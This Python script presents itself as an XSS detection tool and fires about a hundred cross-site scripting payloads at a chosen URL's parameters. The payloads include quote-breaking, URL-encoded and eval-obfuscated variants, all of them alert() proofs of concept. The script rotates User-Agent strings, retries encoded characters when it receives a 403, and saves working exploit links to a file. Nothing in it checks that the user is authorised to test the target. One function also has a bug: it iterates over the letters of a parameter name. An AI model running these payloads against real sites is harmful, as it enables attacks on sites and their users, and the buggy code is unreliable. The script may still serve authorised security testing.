import requests
import time
import argparse
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# Default hardcoded XSS payloads
DEFAULT_XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<a href=javascript:alert('XSS')>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<input type=text value=<script>alert('XSS')</script>>",
    "<textarea><script>alert('XSS')</script></textarea>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<details open ontoggle=alert('XSS')>",
    "<video><source onerror=alert('XSS')></video>",
    "<audio><source onerror=alert('XSS')></audio>",
    "<form action=javascript:alert('XSS')><input type=submit></form>",
    "<object data=javascript:alert('XSS')></object>",
    "<embed src=javascript:alert('XSS')></embed>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<xss id=x tabindex=1 onfocus=alert('XSS')></xss>",
    "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",

    # Payloads with quotes and closing tags
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    "'><img src=x onerror=alert('XSS')>",
    "\"><svg/onload=alert('XSS')>",
    "'><svg/onload=alert('XSS')>",
    "\"><body onload=alert('XSS')>",
    "'><body onload=alert('XSS')>",
    "\"><iframe src=javascript:alert('XSS')>",
    "'><iframe src=javascript:alert('XSS')>",
    "\"><a href=javascript:alert('XSS')>Click me</a>",
    "'><a href=javascript:alert('XSS')>Click me</a>",
    "\"><div onmouseover=alert('XSS')>Hover me</div>",
    "'><div onmouseover=alert('XSS')>Hover me</div>",
    "\"><input type=text value=<script>alert('XSS')</script>>",
    "'><input type=text value=<script>alert('XSS')</script>>",
    "\"><textarea><script>alert('XSS')</script></textarea>",
    "'><textarea><script>alert('XSS')</script></textarea>",
    "\"><marquee onstart=alert('XSS')>XSS</marquee>",
    "'><marquee onstart=alert('XSS')>XSS</marquee>",
    "\"><details open ontoggle=alert('XSS')>",
    "'><details open ontoggle=alert('XSS')>",
    "\"><video><source onerror=alert('XSS')></video>",
    "'><video><source onerror=alert('XSS')></video>",
    "\"><audio><source onerror=alert('XSS')></audio>",
    "'><audio><source onerror=alert('XSS')></audio>",
    "\"><form action=javascript:alert('XSS')><input type=submit></form>",
    "'><form action=javascript:alert('XSS')><input type=submit></form>",
    "\"><object data=javascript:alert('XSS')></object>",
    "'><object data=javascript:alert('XSS')></object>",
    "\"><embed src=javascript:alert('XSS')></embed>",
    "'><embed src=javascript:alert('XSS')></embed>",
    "\"><link rel=stylesheet href=javascript:alert('XSS')>",
    "'><link rel=stylesheet href=javascript:alert('XSS')>",
    "\"><style>@import 'javascript:alert(\"XSS\")';</style>",
    "'><style>@import 'javascript:alert(\"XSS\")';</style>",
    "\"><xss id=x tabindex=1 onfocus=alert('XSS')></xss>",
    "'><xss id=x tabindex=1 onfocus=alert('XSS')></xss>",
    "\"><meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
    "'><meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",

    # Payloads with closing tags first
    "</script><script>alert('XSS')</script>",
    "</style><script>alert('XSS')</script>",
    "</textarea><script>alert('XSS')</script>",
    "</title><script>alert('XSS')</script>",
    "</xss><script>alert('XSS')</script>",

    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert('XSS')%22%3E",
    "%3Csvg%2Fonload%3Dalert('XSS')%3E",
    "%3Cbody%20onload%3Dalert('XSS')%3E",
    "%3Ciframe%20src%3D%22javascript%3Aalert('XSS')%22%3E",
    "%3Ca%20href%3D%22javascript%3Aalert('XSS')%22%3EClick%20me%3C%2Fa%3E",
    "%3Cdiv%20onmouseover%3D%22alert('XSS')%22%3EHover%20me%3C%2Fdiv%3E",
    "%3Cinput%20type%3D%22text%22%20value%3D%22%3Cscript%3Ealert('XSS')%3C%2Fscript%3E%22%3E",
    "%3Ctextarea%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E%3C%2Ftextarea%3E",
    "%3Cmarquee%20onstart%3D%22alert('XSS')%22%3EXSS%3C%2Fmarquee%3E",
    "%3Cdetails%20open%20ontoggle%3D%22alert('XSS')%22%3E",
    "%3Cvideo%3E%3Csource%20onerror%3D%22alert('XSS')%22%3E%3C%2Fvideo%3E",
    "%3Caudio%3E%3Csource%20onerror%3D%22alert('XSS')%22%3E%3C%2Faudio%3E",
    "%3Cform%20action%3D%22javascript%3Aalert('XSS')%22%3E%3Cinput%20type%3D%22submit%22%3E%3C%2Fform%3E",
    "%3Cobject%20data%3D%22javascript%3Aalert('XSS')%22%3E",
    "%3Cembed%20src%3D%22javascript%3Aalert('XSS')%22%3E",
    "%3Clink%20rel%3D%22stylesheet%22%20href%3D%22javascript%3Aalert('XSS')%22%3E",
    "%3Cstyle%3E%40import%20'javascript%3Aalert(%22XSS%22)'%3B%3C%2Fstyle%3E",
    "%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert('XSS')%3E%3C%2Fxss%3E",
    "%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert('XSS')%22%3E",

    # Advanced payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')>",
    "<svg/onload=alert(/XSS/)>",
    "<body onload=alert(/XSS/)>",
    "<iframe src=javascript:eval('alert(\'XSS\')')>",
    "<a href=javascript:eval('alert(\'XSS\')')>Click me</a>",
    "<div onmouseover=eval('alert(\'XSS\')')>Hover me</div>",
    "<input type=text value=<script>eval('alert(\'XSS\')')</script>>",
    "<textarea><script>eval('alert(\'XSS\')')</script></textarea>",
    "<marquee onstart=eval('alert(\'XSS\')')>XSS</marquee>",
    "<details open ontoggle=eval('alert(\'XSS\')')>",
    "<video><source onerror=eval('alert(\'XSS\')')></video>",
    "<audio><source onerror=eval('alert(\'XSS\')')></audio>",
    "<form action=javascript:eval('alert(\'XSS\')')><input type=submit></form>",
    "<object data=javascript:eval('alert(\'XSS\')')></object>",
    "<embed src=javascript:eval('alert(\'XSS\')')></embed>",
    "<link rel=stylesheet href=javascript:eval('alert(\'XSS\')')>",
    "<style>@import 'javascript:eval(\"alert(\'XSS\')\")';</style>",
    "<xss id=x tabindex=1 onfocus=eval('alert(\'XSS\')')></xss>",
    "<meta http-equiv=refresh content=0;url=javascript:eval('alert(\'XSS\')')>"
]

# Special characters to test reflection
SPECIAL_CHARS = ["<", ">", "'", '"', "&", "/", ";", "=", "(", ")", "{", "}", "[", "]", ":", ",", "*", "+", "-", "_", "%", "#", "@", "!", "?", "|", "^", "~", "`"]

# User-Agent strings for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
]

# File to save vulnerable URLs
VULNERABLE_URLS_FILE = "vulnerable_urls.txt"

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def html_encode(char):
    return f"&#{ord(char)};"

def test_special_characters(url, params, method):
    print("\n[+] Testing for reflection of special characters...")
    reflected_chars = []

    for char in SPECIAL_CHARS:
        test_params = {key: char for key in params}
        headers = {"User-Agent": get_random_user_agent()}
        try:
            response = requests.post(url, data=test_params, headers=headers) if method == "POST" else requests.get(url, params=test_params, headers=headers)

            if response.status_code == 403:
                print(f"[!] 403 Forbidden encountered while testing '{char}'. Retrying with encoded character...")
                encoded_char = html_encode(char)
                test_params = {key: encoded_char for key in params}
                response = requests.post(url, data=test_params, headers=headers) if method == "POST" else requests.get(url, params=test_params, headers=headers)

            # Check if the special character is reflected in the response
            if char in response.text or html_encode(char) in response.text:
                print(f"[!] Special character '{char}' is reflected!")
                reflected_chars.append(char)
        except Exception as e:
            print(f"Error testing special character '{char}': {e}")

    if not reflected_chars:
        print("[-] No special characters were reflected.")
    return reflected_chars

def test_xss_payload(url, param, payload, method, delay):
    test_params = {key: payload for key in param}
    headers = {"User-Agent": get_random_user_agent()}
    try:
        response = requests.post(url, data=test_params, headers=headers) if method == "POST" else requests.get(url, params=test_params, headers=headers)

        # Handle 403 Forbidden errors
        if response.status_code == 403:
            print("[!] Received 403 Forbidden. Verifying the cause...")
            clean_params = {key: "" for key in param}
            clean_response = requests.post(url, data=clean_params, headers=headers) if method == "POST" else requests.get(url, params=clean_params, headers=headers)

            if clean_response.status_code == 403:
                print("[!] The server has likely blocked your IP. Waiting before retrying...")
                time.sleep(delay)
            else:
                print("[!] 403 was caused by the payload.")
            return False, None

        # Check for payload reflection
        if payload in response.text:
            print(f"[!] Vulnerable to XSS: Parameter '{param}'")
            print(f"Payload reflected: {payload}")

            # Generate direct link for GET requests
            if method == "GET":
                query_params = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                query_params[param] = payload  # Update the specific parameter
                base_url = url.split('?')[0]  # Get the base URL without query parameters
                direct_link = f"{base_url}?{urllib.parse.urlencode(query_params, doseq=True)}"
                print(f"\033[91m[!] Direct link: {direct_link}\033[0m")  # Red-colored output
                return True, direct_link
            else:
                return True, None

    except Exception as e:
        print(f"Error testing parameter '{param}' with payload: {e}")
    return False, None

def test_xss_payloads(url, params, method, payloads, delay):
    print("\n[+] Testing XSS payloads...")
    vulnerable = False
    vulnerable_urls = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for payload in payloads:
            for param in params:
                futures.append(executor.submit(test_xss_payload, url, param, payload, method, delay))

        for future in as_completed(futures):
            result, direct_link = future.result()
            if result:
                vulnerable = True
                if direct_link:
                    vulnerable_urls.append(direct_link)

    if not vulnerable:
        print("[-] No XSS vulnerabilities detected.")
    else:
        # Save vulnerable URLs to a file
        with open(VULNERABLE_URLS_FILE, "w") as f:
            for url in vulnerable_urls:
                f.write(url + "\n")
        print(f"[+] Vulnerable URLs saved to {VULNERABLE_URLS_FILE}")

def main():
    parser = argparse.ArgumentParser(description="Advanced XSS Detection Tool")
    parser.add_argument("url", help="The target URL")
    parser.add_argument("-p", "--params", nargs="+", help="Parameters to test (e.g., param1 param2)", required=True)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use (default: GET)")
    parser.add_argument("--wordlist", help="Path to a custom XSS payload wordlist")
    parser.add_argument("--delay", type=int, default=300, help="Delay (in seconds) between requests to handle rate limiting (default: 300)")
    parser.add_argument("-r", "--reflection-only", action="store_true", help="Only test for reflection of special characters, skip XSS payload testing")
    parser.add_argument("-nr", "--no-reflection", action="store_true", help="Skip reflection testing and only test for XSS vulnerabilities")

    args = parser.parse_args()

    # Parse parameter names into a dictionary
    params = {param: "" for param in args.params}

    # Load payloads from wordlist or use default payloads
    if args.wordlist:
        try:
            with open(args.wordlist, "r") as f:
                payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading wordlist: {e}")
            return
    else:
        payloads = DEFAULT_XSS_PAYLOADS

    # Test for special character reflection unless --no-reflection is specified
    if not args.no_reflection:
        reflected_chars = test_special_characters(args.url, params, args.method)
    else:
        reflected_chars = []

    # If --reflection-only is specified, skip XSS payload testing
    if args.reflection_only:
        print("[+] Reflection-only mode: Skipping XSS payload testing.")
        return

    # If any special characters are reflected or --no-reflection is specified, proceed with XSS payloads
    if reflected_chars or args.no_reflection:
        test_xss_payloads(args.url, params, args.method, payloads, args.delay)

if __name__ == "__main__":
    main()
